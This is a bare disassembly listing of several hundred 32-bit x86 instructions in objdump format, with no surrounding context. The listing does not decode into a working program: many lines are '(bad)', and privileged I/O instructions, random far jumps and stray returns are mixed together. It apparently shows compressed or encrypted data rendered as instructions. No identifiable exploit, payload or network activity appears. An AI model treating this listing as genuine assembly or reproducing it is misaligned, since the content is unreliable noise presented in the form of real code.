  406b4a:	mov    cl,BYTE PTR [ecx]
  406b4c:	xor    esp,DWORD PTR [edi+edi*2]
  406b4f:	or     DWORD PTR [ebp+0x4f87a179],edx
  406b55:	(bad)  
  406b56:	out    dx,al
  406b57:	dec    edx
  406b58:	in     al,0xac
  406b5a:	cdq    
  406b5b:	test   DWORD PTR [ecx+0x9],0xb200bcb
  406b62:	cli    
  406b63:	push   0xffffff97
  406b65:	stos   BYTE PTR es:[edi],al
  406b66:	aaa    
  406b67:	jl     0x406b45
  406b69:	lods   al,BYTE PTR ds:[esi]
  406b6a:	int3   
  406b6b:	sbb    BYTE PTR gs:[edx],bl
  406b6e:	or     BYTE PTR [eax+0x4c8d4f3],bh
  406b74:	shl    esp,1
  406b76:	mov    ah,0xb9
  406b78:	shl    bl,cl
  406b7a:	pop    ds
  406b7b:	mov    DWORD PTR [eax+0x73e9e722],ebp
  406b81:	mov    bl,0x1b
  406b83:	mov    dl,0xb0
  406b85:	loop   0x406c04
  406b87:	icebp  
  406b88:	xchg   DWORD PTR [ecx],eax
  406b8a:	gs sub eax,0xb96b9c0
  406b90:	outs   dx,BYTE PTR ds:[esi]
  406b91:	repnz xchg edi,eax
  406b93:	ins    DWORD PTR es:[edi],dx
  406b94:	fidivr DWORD PTR ds:0x15596a3a
  406b9a:	sbb    eax,0x5322b79
  406b9f:	jp     0x406c1f
  406ba1:	ret    
  406ba2:	(bad)  
  406ba3:	in     eax,0xa1
  406ba5:	lods   al,BYTE PTR ds:[esi]
  406ba6:	test   BYTE PTR [edx],bl
  406ba8:	ret    
  406ba9:	fstp   TBYTE PTR [esi]
  406bab:	sub    BYTE PTR [eax],ch
  406bad:	daa    
  406bae:	adc    DWORD PTR [edx-0x7dce3453],ebx
  406bb4:	(bad)  
  406bb5:	xor    DWORD PTR [ecx+0x7f],esp
  406bb8:	les    esi,FWORD PTR ds:0xf1b6b87f
  406bbe:	xor    ebx,ecx
  406bc0:	aas    
  406bc1:	xchg   esi,eax
  406bc2:	sub    BYTE PTR [edx-0x5a196d38],bh
  406bc8:	xor    BYTE PTR fs:[ebp-0xa],0x2e
  406bcd:	mov    ah,0xc8
  406bcf:	fstp   TBYTE PTR ds:0x58d9b66f
  406bd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bd6:	push   eax
  406bd7:	arpl   si,cx
  406bd9:	adc    ebx,DWORD PTR [edi+0x2f2a8f15]
  406bdf:	xor    esp,ebx
  406be1:	jl     0x406bcd
  406be3:	(bad)  
  406be4:	in     eax,0x2
  406be6:	and    cl,0xd4
  406be9:	xchg   esi,eax
  406bea:	mov    cl,0x1f
  406bec:	push   ecx
  406bed:	sar    DWORD PTR [esp+ebp*4-0x75],0x84
  406bf2:	xlat   BYTE PTR ds:[ebx]
  406bf3:	ins    BYTE PTR es:[edi],dx
  406bf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bf5:	pop    edi
  406bf6:	fadd   DWORD PTR [ebx+ebx*2]
  406bf9:	mov    esi,0xd6f206a8
  406bfe:	sahf   
  406bff:	xor    cl,BYTE PTR [ebx+0x68]
  406c02:	mov    ecx,0xa9832974
  406c07:	lods   al,BYTE PTR ds:[esi]
  406c08:	clc    
  406c09:	xchg   esi,eax
  406c0a:	lods   al,BYTE PTR ds:[esi]
  406c0b:	pop    eax
  406c0c:	pop    ebp
  406c0d:	fld    TBYTE PTR [ecx]
  406c0f:	xor    eax,0x9d9cbc89
  406c14:	push   esi
  406c15:	ret    
  406c16:	test   bh,al
  406c18:	sub    BYTE PTR [edx-0x5],bh
  406c1b:	int3   
  406c1c:	jecxz  0x406c64
  406c1e:	in     eax,dx
  406c1f:	loope  0x406bef
  406c21:	adc    eax,0xfd11acdf
  406c26:	mov    es,WORD PTR [edx+0x3d]
  406c29:	mov    cl,0x1b
  406c2b:	dec    esi
  406c2c:	pop    eax
  406c2d:	mov    ds:0xfe50dc60,al
  406c32:	add    DWORD PTR [edi+0x4],ecx
  406c35:	gs (bad) 
  406c37:	retf   
  406c38:	push   ecx
  406c39:	mul    edx
  406c3b:	push   DWORD PTR [esi+0x1c337814]
  406c41:	sbb    al,0xeb
  406c43:	dec    esi
  406c44:	inc    esi
  406c45:	or     BYTE PTR [eax+0x4b],cl
  406c48:	popa   
  406c49:	or     edx,eax
  406c4b:	jne    0x406c2a
  406c4d:	mov    edi,0x21e9ede5
  406c52:	(bad)  
  406c53:	std    
  406c54:	ret    
  406c55:	cmp    BYTE PTR [ebp+0x69abc18a],0x25
  406c5c:	add    al,0x3f
  406c5e:	dec    edi
  406c5f:	ins    DWORD PTR es:[edi],dx
  406c60:	pop    edx
  406c61:	fist   DWORD PTR [eax]
  406c63:	xor    eax,0xe35e3c5d
  406c68:	and    BYTE PTR [eax+0x6e307a9f],cl
  406c6e:	mov    ebx,0xf5625a85
  406c73:	leave  
  406c74:	nop
  406c75:	mov    eax,ds:0xa3581c8e
  406c7a:	stos   DWORD PTR es:[edi],eax
  406c7b:	lods   eax,DWORD PTR ds:[esi]
  406c7c:	and    edi,eax
  406c7e:	jno    0x406c4b
  406c80:	mov    ebx,0x7e34d608
  406c85:	fwait
  406c86:	pop    ebp
  406c87:	daa    
  406c88:	loopne 0x406cf6
  406c8a:	retf   
  406c8b:	call   0xcf85:0xfcb4defb
  406c92:	sub    DWORD PTR [ebp-0x636fa763],ebx
  406c98:	xchg   ebx,eax
  406c99:	je     0x406cef
  406c9b:	xchg   ecx,eax
  406c9c:	jge    0x406c35
  406c9e:	mov    edx,0xf4aa5ab5
  406ca3:	or     esp,DWORD PTR [edx+0x76a96218]
  406ca9:	mov    dh,BYTE PTR [esi+0x28]
  406cac:	inc    ebx
  406cad:	(bad)  
  406cae:	mov    ah,0x63
  406cb0:	dec    edi
  406cb1:	pop    es
  406cb2:	fdiv   QWORD PTR [eax+0x28]
  406cb5:	xor    dl,BYTE PTR [ebp-0x25491a3]
  406cbb:	xlat   BYTE PTR ds:[ebx]
  406cbc:	xlat   BYTE PTR ds:[ebx]
  406cbd:	sub    esp,0xe
  406cc0:	jg     0x406cd1
  406cc2:	lock aas 
  406cc4:	or     BYTE PTR [ecx-0x5337bcb0],cl
  406cca:	fldenv [eax]
  406ccc:	pop    ebp
  406ccd:	pusha  
  406cce:	std    
  406ccf:	mov    dh,0xb3
  406cd1:	adc    al,BYTE PTR [edx]
  406cd3:	sbb    DWORD PTR [esp+edx*4+0x6650e698],edx
  406cda:	add    BYTE PTR [esi+eax*8-0x3b],ah
  406cde:	retf   0xe1a6
  406ce1:	mov    al,ds:0xcfda72da
  406ce6:	test   DWORD PTR [edx-0x13248ee4],0x1e1f7db
  406cf0:	loop   0x406c74
  406cf2:	or     DWORD PTR [ebp+0x2c06cdfa],ebp
  406cf8:	xchg   esi,eax
  406cf9:	jmp    0x7856:0xbf3fa781
  406d00:	fild   QWORD PTR [ecx]
  406d02:	pop    esi
  406d03:	loopne 0x406d2b
  406d05:	pop    eax
  406d06:	sbb    dl,ah
  406d08:	and    dh,bl
  406d0a:	cs inc ebp
  406d0c:	and    edx,DWORD PTR [ebx-0x6e01dca8]
  406d12:	cli    
  406d13:	inc    ax
  406d15:	int    0x44
  406d17:	mov    dh,0x41
  406d19:	(bad)  
  406d1a:	rcr    BYTE PTR [eax],cl
  406d1c:	mov    ah,0x58
  406d1e:	clc    
  406d1f:	ins    DWORD PTR es:[edi],dx
  406d20:	int    0x22
  406d22:	pop    ds
  406d23:	xor    dh,BYTE PTR [eax-0x53ea938]
  406d29:	arpl   WORD PTR [esi+0xd],dx
  406d2c:	mov    eax,ds:0x70c74d5
  406d31:	jb     0x406d60
  406d33:	call   0x1d73ca17
  406d38:	retf   0x12b6
  406d3b:	jmp    0x7eca:0xf1c2808e
  406d42:	imul   edx,esp,0x4283e775
  406d48:	sar    esp,1
  406d4a:	rcr    DWORD PTR [ebx-0x40],1
  406d4d:	xlat   BYTE PTR ds:[ebx]
  406d4e:	dec    ecx
  406d4f:	loope  0x406d1c
  406d51:	or     ch,BYTE PTR [edx+0x6e9ca835]
  406d57:	inc    ebp
  406d58:	xchg   BYTE PTR [bp+si-0x7133],ch
  406d5d:	adc    edx,DWORD PTR [edx-0x6e]
  406d60:	pop    esi
  406d61:	pop    eax
  406d62:	xchg   ebx,eax
  406d63:	add    al,0x7
  406d65:	out    0x51,eax
  406d67:	daa    
  406d68:	lods   al,BYTE PTR ds:[esi]
  406d69:	jno    0x406d72
  406d6b:	jmp    0xb402:0x20545ce2
  406d72:	std    
  406d73:	int    0x5f
  406d75:	xchg   esi,eax
  406d76:	add    ecx,DWORD PTR [ecx+ecx*4-0x202a9272]
  406d7d:	imul   BYTE PTR [edx+0x4c01e6db]
  406d83:	adc    esi,DWORD PTR [eax+0x7cf9a411]
  406d89:	cmp    edi,DWORD PTR [eax-0x73aa24d]
  406d8f:	dec    ebx
  406d90:	aad    0x61
  406d92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d93:	iret   
  406d94:	mov    ds:0xcae093d2,eax
  406d99:	fisubr WORD PTR [esi+0x546f6639]
  406d9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406da0:	xchg   BYTE PTR [edi-0x3d4d252f],dh
  406da6:	pop    ebx
  406da7:	xchg   edi,eax
  406da8:	cmp    al,0xf9
  406daa:	int3   
  406dab:	aad    0xfa
  406dad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dae:	inc    ebp
  406daf:	xchg   BYTE PTR [ebp+0x65],bl
  406db2:	out    dx,al
  406db3:	jae    0x406df8
  406db5:	jle    0x406d77
  406db7:	sbb    DWORD PTR [ebp+ebx*4-0x56207f9e],esp
  406dbe:	shl    DWORD PTR [edx-0x75],cl
  406dc1:	dec    ecx
  406dc2:	or     bl,BYTE PTR [eax-0xbe7067a]
  406dc8:	inc    ebx
  406dc9:	das    
  406dca:	(bad)  
  406dcb:	mov    ebp,0x1fe643da
  406dd0:	inc    ecx
  406dd1:	xlat   BYTE PTR ds:[ebx]
  406dd2:	js     0x406e36
  406dd4:	xchg   edi,eax
  406dd5:	adc    DWORD PTR [ebp-0x5fef1bd9],ecx
  406ddb:	cld    
  406ddc:	dec    ecx
  406ddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dde:	cmp    BYTE PTR [eax],ch
  406de0:	nop
  406de1:	ins    BYTE PTR es:[edi],dx
  406de2:	popf   
  406de3:	inc    ebp
  406de4:	mov    ch,0xa3
  406de6:	sbb    edi,DWORD PTR [ecx+0xa0dcd05]
  406dec:	test   eax,0xf65556bf
  406df1:	bound  esi,QWORD PTR [ebx+0x5baa0fb9]
  406df7:	xor    BYTE PTR [ebp+0x25550c41],ah
  406dfd:	jno    0x406dd7
  406dff:	neg    BYTE PTR [ebx+0x65]
  406e02:	pop    ds
  406e03:	frstor [esi]
  406e05:	xchg   esi,eax
  406e06:	xchg   edi,eax
  406e07:	call   0x65aa0528
  406e0c:	push   ecx
  406e0d:	add    eax,0xf9ec23eb
  406e12:	cmp    DWORD PTR [edi+0x7076da39],edx
  406e18:	pop    esp
  406e19:	fscale 
  406e1b:	loopne 0x406dae
  406e1d:	in     al,dx
  406e1e:	push   esp
  406e1f:	mov    ah,0x93
  406e21:	mov    edi,0x39022e9b
  406e26:	or     al,0x5
  406e28:	pop    esi
  406e29:	cmp    eax,0xa2f54405
  406e2e:	push   edx
  406e2f:	(bad)  
  406e30:	jbe    0x406e87
  406e32:	(bad)  [ebp-0x157c3aef]
  406e38:	je     0x406e29
  406e3a:	ret    
  406e3b:	dec    ebp
  406e3c:	jmp    0xd64d:0x415190b6
  406e43:	sar    BYTE PTR [eax-0x22],cl
  406e46:	cmp    dh,BYTE PTR [edx+0x2f1c39b0]
  406e4c:	aad    0x49
  406e4e:	lds    ecx,FWORD PTR [esi]
  406e50:	jnp    0x406e5b
  406e52:	dec    eax
  406e53:	(bad)  
  406e54:	addr16 inc ebp
  406e56:	loop   0x406e9f
  406e58:	mov    al,0x2a
  406e5a:	stc    
  406e5b:	jle    0x406e47
  406e5d:	xchg   esi,ebx
  406e5f:	retf   0x6f5d
  406e62:	mov    al,ds:0x726dd980
  406e67:	dec    edx
  406e68:	dec    ebp
  406e69:	dec    ebp
  406e6a:	push   DWORD PTR [eax]
  406e6c:	das    
  406e6d:	(bad)  
  406e6e:	rcl    BYTE PTR [ecx],1
  406e70:	push   ss
  406e71:	add    ecx,DWORD PTR [ebx+0x44]
  406e74:	lea    edx,[ebx]
  406e76:	adc    esi,DWORD PTR [edi-0x61]
  406e79:	rol    DWORD PTR [edx],0xb8
  406e7c:	mov    ebp,eax
  406e7e:	arpl   WORD PTR [esi-0x4],si
  406e81:	sahf   
  406e82:	sbb    al,0x3
  406e84:	retf   
  406e85:	sbb    eax,0xcf9a02bf
  406e8a:	mov    dl,0x66
  406e8c:	mov    esi,edi
  406e8e:	xor    al,0xfe
  406e90:	nop
  406e91:	stos   BYTE PTR es:[edi],al
  406e92:	push   esi
  406e93:	jle    0x406e96
  406e95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e96:	stos   BYTE PTR es:[edi],al
  406e97:	dec    ebp
  406e98:	jmp    0x5582:0xe31fa063
  406e9f:	inc    ebx
  406ea0:	inc    edx
  406ea1:	scas   al,BYTE PTR es:[edi]
  406ea2:	mov    ecx,0x73ddc925
  406ea7:	fcomp  st(4)
  406ea9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406eaa:	das    
  406eab:	or     eax,0x1e3004ff
  406eb0:	out    dx,eax
  406eb1:	jmp    0x406ee5
  406eb3:	rcr    BYTE PTR [edi-0x2025419f],cl
  406eb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406eba:	call   0xf5b1000f
  406ebf:	stc    
  406ec0:	mov    DWORD PTR ds:0x7d7d3a07,esi
  406ec6:	stc    
  406ec7:	mov    esp,0x9e3befa3
  406ecc:	xchg   edx,eax
  406ecd:	jp     0x406e9f
  406ecf:	es stc 
  406ed1:	mov    bl,0x7d
  406ed3:	pushf  
  406ed4:	sti    
  406ed5:	sbb    BYTE PTR [ebx],0x3
  406ed8:	jmp    0xf418:0xe9fb67a4
  406edf:	stos   DWORD PTR es:[edi],eax
  406ee0:	and    BYTE PTR [esp+edi*8],dh
  406ee3:	sbb    al,0x51
  406ee5:	pop    es
  406ee6:	stos   DWORD PTR es:[edi],eax
  406ee7:	loopne 0x406ee4
  406ee9:	xor    ebx,DWORD PTR [edx]
  406eeb:	jp     0x406eeb
  406eed:	sub    ebp,eax
  406eef:	loopne 0x406f5f
  406ef1:	xchg   esp,eax
  406ef2:	mov    esp,0xbd878aae
  406ef7:	aad    0x4e
  406ef9:	sub    al,0xc6
  406efb:	ret    
  406efc:	mov    edx,0xaa8d93c5
  406f01:	into   
  406f02:	mov    ecx,DWORD PTR [ecx-0x33c11d94]
  406f08:	jne    0x406f62
  406f0a:	sti    
  406f0b:	into   
  406f0c:	punpckhwd mm1,mm4
  406f0f:	or     BYTE PTR [eax-0x5c],ch
  406f12:	out    0x8c,al
  406f14:	mov    esi,0x71a4d147
  406f19:	into   
  406f1a:	xchg   ecx,eax
  406f1b:	test   al,0x2d
  406f1d:	xor    al,0x5b
  406f1f:	xchg   edi,eax
  406f20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f21:	(bad)  
  406f23:	mov    ch,0x66
  406f25:	xor    al,BYTE PTR ds:0x2f20602a
  406f2b:	pop    eax
  406f2c:	std    
  406f2d:	(bad)  
  406f2e:	mul    DWORD PTR [ebp-0x17]
  406f31:	mov    ds:0xd06a76e4,al
  406f36:	adc    al,dl
  406f38:	pop    ds
  406f39:	cmp    eax,esi
  406f3b:	repnz imul DWORD PTR [esi+0x138cf807]
  406f42:	sub    eax,0x1b80e368
  406f47:	cmp    BYTE PTR [ebx+0x6e],ch
  406f4a:	ret    0x489f
  406f4d:	dec    edx
  406f4e:	out    dx,al
  406f4f:	pop    edi
  406f50:	xchg   ebp,eax
  406f51:	xor    esi,DWORD PTR [edi+0x17618ac7]
  406f57:	jg     0x406fb8
  406f59:	jl     0x406f1d
  406f5b:	mov    edx,0xa5a3fec6
  406f60:	pop    eax
  406f61:	(bad)  
  406f62:	jecxz  0x406fc8
  406f64:	std    
  406f65:	and    al,0x3a
  406f67:	mov    ebx,0xebb327b5
  406f6c:	repnz push cs
  406f6e:	out    0x2f,al
  406f70:	mov    DWORD PTR [edi-0x44],edx
  406f73:	add    edx,ecx
  406f75:	pop    ebx
  406f76:	adc    BYTE PTR [ecx-0x6b],dl
  406f79:	mov    edx,0xd778ad77
  406f7e:	scas   eax,DWORD PTR es:[edi]
  406f7f:	mov    ch,0x96
  406f81:	dec    ebx
  406f82:	inc    ebx
  406f83:	leave  
  406f84:	pushf  
  406f85:	into   
  406f86:	fs retf 0xe1a2
  406f8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f8b:	or     BYTE PTR [ebx+ebp*8],ah
  406f8e:	xor    BYTE PTR [edi],al
  406f90:	adc    BYTE PTR [esi+0x423ccba9],0x43
  406f97:	sub    bh,BYTE PTR [ebp-0x7d]
  406f9a:	gs in  eax,dx
  406f9c:	dec    edi
  406f9d:	mov    ecx,ebp
  406f9f:	loop   0x406f3e
  406fa1:	ins    BYTE PTR es:[edi],dx
  406fa2:	jns    0x406f9c
  406fa4:	jmp    0xa7c8c11f
  406fa9:	jae    0x406fea
  406fab:	sub    esp,0x4e
  406fae:	inc    eax
  406faf:	cwde   
  406fb0:	jae    0x406fa2
  406fb2:	int3   
  406fb3:	(bad)  [esp+ecx*4]
  406fb6:	xchg   esp,eax
  406fb7:	adc    DWORD PTR [ebx],esi
  406fb9:	fimul  DWORD PTR [edi]
  406fbb:	ins    BYTE PTR es:[edi],dx
  406fbc:	adc    al,0xaa
  406fbe:	dec    ebp
  406fbf:	cs (bad) 
  406fc1:	mov    bh,0xcd
  406fc3:	inc    edi
  406fc4:	mov    ecx,0xc1cb1fb4
  406fc9:	mov    eax,0xb93b0058
  406fce:	jnp    0x407044
  406fd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fd1:	popf   
  406fd2:	jge    0x406fc1
  406fd4:	xchg   edi,eax
  406fd5:	pop    ds
  406fd6:	ret    0x86c4
  406fd9:	pop    DWORD PTR ds:0x64233e4c
  406fdf:	scas   al,BYTE PTR es:[edi]
  406fe0:	xchg   esi,eax
  406fe1:	gs ins BYTE PTR es:[edi],dx
  406fe3:	(bad)  
  406fe4:	rol    BYTE PTR [ebx],0x1a
  406fe7:	pop    ds
  406fe8:	inc    esp
  406fe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fea:	(bad)  
  406fec:	in     al,dx
  406fed:	fcomp  DWORD PTR [ebx]
  406fef:	shr    DWORD PTR [edx+0x51],cl
  406ff2:	lds    ecx,FWORD PTR [ecx-0x25e27fbc]
  406ff8:	mov    bh,dl
  406ffa:	int    0xa
  406ffc:	rcr    DWORD PTR [edx],cl
  406ffe:	and    al,0xc7
  407000:	push   esi
  407001:	mov    ecx,0xe762c7f2
  407006:	sbb    DWORD PTR [ebx],edi
  407008:	sbb    eax,0xff59629b
  40700d:	and    al,0x7d
  40700f:	jmp    0x8326:0x1d95762d
  407016:	lds    ebp,FWORD PTR [eax]
  407018:	(bad)  
  407019:	ficomp DWORD PTR [eax+0x32]
  40701c:	pusha  
  40701d:	fwait
  40701e:	out    0x31,eax
  407020:	push   ss
  407021:	mov    BYTE PTR [ebp+0x614c4f86],bl
  407027:	sbb    edx,eax
  407029:	test   eax,0xcc8ae847
  40702e:	aad    0xe1
  407030:	and    BYTE PTR [ecx-0x7],ah
  407033:	pusha  
  407034:	fucom  st(7)
  407036:	add    ebp,esi
  407038:	xchg   edx,eax
  407039:	dec    edi
  40703a:	enter  0xd2c1,0x21
  40703e:	and    eax,0xfb9a8426
  407043:	mov    WORD PTR [eax-0x656c9f13],ds
  407049:	add    esi,edi
  40704b:	or     bh,BYTE PTR [ebx]
  40704d:	jmp    0x4070bf
  40704f:	pop    ebp
  407050:	mov    bl,0x36
  407052:	inc    ecx
  407053:	cs (bad) 
  407055:	lock mov ebp,0xef450198
  40705b:	pushf  
  40705c:	dec    esi
  40705d:	inc    eax
  40705e:	cwde   
  40705f:	aam    0x73
  407061:	jae    0x407035
  407063:	je     0x406ffd
  407065:	fmul   DWORD PTR [ebp+ecx*8-0x6e89374a]
  40706c:	pop    ebx
  40706d:	jmp    FWORD PTR [ecx+0x3bec7785]
  407073:	shr    BYTE PTR [ebx],1
  407075:	add    DWORD PTR [edi+0x715a8ab2],esp
  40707b:	das    
  40707c:	test   DWORD PTR [edx-0x5d1940f8],eax
  407082:	jge    0x40703c
  407084:	adc    bh,dl
  407086:	out    0x50,al
  407088:	add    dh,BYTE PTR [ecx-0x1a9944a4]
  40708e:	and    DWORD PTR ds:0x3ce0e243,ebx
  407094:	or     al,0x49
  407096:	sahf   
  407097:	js     0x407036
  407099:	dec    ebp
  40709a:	repz rcl DWORD PTR [edx-0x47],0x6
  40709f:	aad    0x50
  4070a1:	push   esp
  4070a2:	xor    DWORD PTR [edi+esi*1+0x21],edi
  4070a6:	lea    esi,[esi+0x26a43ece]
  4070ac:	sbb    BYTE PTR [edi+esi*2],ah
  4070af:	(bad)  
  4070b0:	fcomp  DWORD PTR [ecx-0x23dcb6e0]
  4070b6:	mov    ds:0xe491bece,eax
  4070bb:	sahf   
  4070bc:	inc    eax
  4070bd:	test   dh,bl
  4070bf:	inc    esi
  4070c0:	xchg   esi,eax
  4070c1:	push   ebx
  4070c2:	(bad)  
  4070c3:	xlat   BYTE PTR ds:[ebx]
  4070c4:	in     al,0xda
  4070c6:	aas    
  4070c7:	or     BYTE PTR [ecx],0x43
  4070ca:	jecxz  0x407127
  4070cc:	rcl    BYTE PTR [eax+0x576d1ec9],1
  4070d2:	push   0x86fb5115
  4070d7:	mov    bh,0x9d
  4070d9:	mov    ch,0x11
  4070db:	push   cs
  4070dc:	cs inc esi
  4070de:	es cs jbe 0x407092
  4070e2:	xlat   BYTE PTR ds:[ebx]
  4070e3:	jb     0x4070b7
  4070e5:	sub    eax,0x7268b40e
  4070ea:	dec    ebp
  4070eb:	mov    edx,0xc02c99b
  4070f0:	fs addr16 jo 0x407105
  4070f4:	lds    eax,FWORD PTR [ecx+ebp*2]
  4070f7:	sbb    eax,0x988710dc
  4070fc:	inc    ebx
  4070fd:	popa   
  4070fe:	mov    al,0x24
  407100:	jmp    0x8a55adf3
  407105:	mov    esi,eax
  407107:	test   al,0x67
  407109:	jbe    0x40708c
  40710b:	mov    al,ds:0x715ffcc
  407110:	mov    dh,0x26
  407112:	adc    bl,BYTE PTR [ecx+0x11297156]
  407118:	pop    ecx
  407119:	xor    al,0xcb
  40711b:	mov    dh,dh
  40711d:	arpl   WORD PTR [ebx-0x52],bx
  407120:	dec    edx
  407121:	or     eax,0xc40192c8
  407126:	aas    
  407127:	ret    0xf59f
  40712a:	mov    ah,0xff
  40712c:	jbe    0x4070b7
  40712e:	mov    esi,0x9d12ab58
  407133:	cmp    eax,0x60869f1e
  407138:	fdiv   DWORD PTR [ecx-0x4a]
  40713b:	add    eax,0x189cc232
  407140:	mov    bl,0x90
  407142:	add    al,0x58
  407144:	mov    cl,0xd4
  407146:	mov    eax,0x7c24e263
  40714b:	xchg   ecx,eax
  40714c:	sbb    al,0x91
  40714e:	jl     0x407124
  407150:	int3   
  407151:	mov    DWORD PTR [esi+0x32a0ea1],ebp
  407157:	add    BYTE PTR [edi-0x70],cl
  40715a:	and    eax,0xb3b4a73a
  40715f:	test   al,0xc0
  407161:	mov    ecx,0xea240bc8
  407166:	sub    ecx,ebx
  407168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407169:	cld    
  40716a:	pop    esi
  40716b:	lods   al,BYTE PTR ds:[esi]
  40716c:	loopne 0x407120
  40716e:	jns    0x407179
  407170:	mov    ch,BYTE PTR [ecx]
  407172:	inc    eax
  407173:	xor    ebx,DWORD PTR [ebx]
  407175:	scas   eax,DWORD PTR es:[edi]
  407176:	cli    
  407177:	push   eax
  407178:	sub    DWORD PTR [ebx+eax*8-0x4],edx
  40717c:	jmp    0x407135
  40717e:	ja     0x40717f
  407180:	(bad)  
  407181:	les    esi,FWORD PTR [esi+ebx*1-0x15]
  407185:	push   ebp
  407186:	xchg   edi,eax
  407187:	fsub   DWORD PTR [edx]
  407189:	pop    esi
  40718a:	fldenv [edx-0x12d58175]
  407190:	jmp    0x964a:0x3f056355
  407197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407198:	or     edx,0x82ff38b
  40719e:	jg     0x407173
  4071a0:	nop
  4071a1:	std    
  4071a2:	mul    BYTE PTR [esi+ebp*4-0x42]
  4071a6:	mov    ch,0x19
  4071a8:	es je  0x4071a5
  4071ab:	mov    eax,0x17f7bda6
  4071b0:	ds push 0xffffff90
  4071b3:	add    bl,dl
  4071b5:	dec    ecx
  4071b6:	cmp    al,0xf0
  4071b8:	int    0x93
  4071ba:	inc    ebp
  4071bb:	and    bl,0x1
  4071be:	lods   eax,DWORD PTR ds:[esi]
  4071bf:	jmp    0x407185
  4071c1:	xchg   esi,eax
  4071c2:	dec    ebx
  4071c3:	xchg   DWORD PTR ds:0xd9560462,esp
  4071c9:	cmp    DWORD PTR [ebx+edi*1-0x10198040],ebx
  4071d0:	or     eax,0x760ce510
  4071d5:	mov    eax,0xfa7099e6
  4071da:	and    ebp,esp
  4071dc:	retf   
  4071dd:	dec    ebx
  4071de:	xor    BYTE PTR [ecx],0xc3
  4071e1:	outs   dx,DWORD PTR ds:[esi]
  4071e2:	dec    ecx
  4071e3:	push   esi
  4071e4:	in     eax,0x97
  4071e6:	arpl   WORD PTR [ecx],dx
  4071e8:	std    
  4071e9:	jecxz  0x407201
  4071eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071ec:	jle    0x4071c9
  4071ee:	sub    al,0x3d
  4071f0:	xchg   esp,eax
  4071f1:	push   0xffffff91
  4071f3:	data16 mov BYTE PTR [eax],bh
  4071f6:	jbe    0x407227
  4071f8:	je     0x407266
  4071fa:	fucomi st,st(3)
  4071fc:	icebp  
  4071fd:	mov    ds:0xf9154668,al
  407202:	aad    0xaf
  407204:	stc    
  407205:	pusha  
  407206:	jns    0x40727e
  407208:	iret   
  407209:	jbe    0x4071af
  40720b:	loope  0x40719f
  40720d:	cmc    
  40720e:	aaa    
  40720f:	xor    al,bl
  407211:	ret    0x6d52
  407214:	pop    ds
  407215:	jb     0x4071fd
  407217:	mov    al,BYTE PTR [esi-0x70983e0b]
  40721d:	div    DWORD PTR [edx]
  40721f:	xlat   BYTE PTR ds:[ebx]
  407220:	out    dx,eax
  407221:	call   FWORD PTR [ebx]
  407223:	int3   
  407224:	popa   
  407225:	adc    al,0xc4
  407227:	or     eax,0x2f0cac4
  40722c:	inc    ecx
  40722d:	jb     0x4072ad
  40722f:	es xchg edi,eax
  407231:	test   DWORD PTR [eax-0xe],esi
  407234:	test   BYTE PTR [eax+0x1b],dh
  407237:	push   DWORD PTR [esi]
  407239:	cmp    BYTE PTR [ecx+0x9b475b3],dl
  40723f:	into   
  407240:	daa    
  407241:	vorps  ymm0,ymm3,YMMWORD PTR [esi+0x45]
  407246:	xchg   BYTE PTR [esi-0x53],dh
  407249:	rol    BYTE PTR [eax],cl
  40724b:	retf   0x5dd0
  40724e:	mov    ecx,0x21cc2e03
  407253:	xchg   edi,eax
  407254:	push   es
  407255:	dec    ebx
  407256:	or     al,0x7c
  407258:	mov    al,ds:0x4feb405d
  40725d:	aad    0xe4
  40725f:	push   es
  407260:	scas   al,BYTE PTR es:[edi]
  407261:	mov    ebx,0xfe704046
  407266:	and    al,0xf8
  407268:	aaa    
  407269:	lods   eax,DWORD PTR ds:[esi]
  40726a:	hlt    
  40726b:	pop    esp
  40726c:	je     0x40722e
  40726e:	dec    edx
  40726f:	inc    ecx
  407270:	push   0x6d48fa4d
  407275:	mov    WORD PTR [ebp+0x7d421fdf],fs
  40727b:	popf   
  40727c:	inc    eax
  40727d:	and    ecx,DWORD PTR [ebp-0xb]
  407280:	fisubr DWORD PTR [edx+0x7b]
  407283:	sub    al,0x88
  407285:	inc    esi
  407286:	jae    0x40725e
  407288:	in     al,dx
  407289:	cmc    
  40728a:	add    eax,0x3ed9a4b4
  40728f:	dec    esi
  407290:	or     eax,0xd871ce89
  407295:	mov    al,ds:0xca6fb6ec
  40729a:	(bad)  [edx-0x54f147e9]
  4072a0:	push   es
  4072a1:	aam    0xee
  4072a3:	fimul  DWORD PTR [ebp+eax*4+0x13678dec]
  4072aa:	push   ss
  4072ab:	mov    ebx,0xc77aff05
  4072b0:	pop    esp
  4072b1:	mov    dh,0x43
  4072b3:	lea    eax,[esi]
  4072b5:	jl     0x40732b
  4072b7:	adc    DWORD PTR [ecx-0x39],ecx
  4072ba:	enter  0xc15e,0xf9
  4072be:	outs   dx,BYTE PTR ds:[esi]
  4072bf:	adc    eax,0xe91c1ea
  4072c4:	xor    BYTE PTR [eax-0x23],bh
  4072c7:	ficomp WORD PTR [ecx]
  4072c9:	out    dx,al
  4072ca:	adc    bh,BYTE PTR [ecx+0x76]
  4072cd:	mov    bh,0x5
  4072cf:	ror    DWORD PTR [ecx-0x5d],1
  4072d2:	(bad)  
  4072d4:	rol    bl,0xf1
  4072d7:	in     eax,dx
  4072d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072d9:	push   ebx
  4072da:	enter  0x2079,0x33
  4072de:	or     ebx,DWORD PTR [ebx+0x228ce3c0]
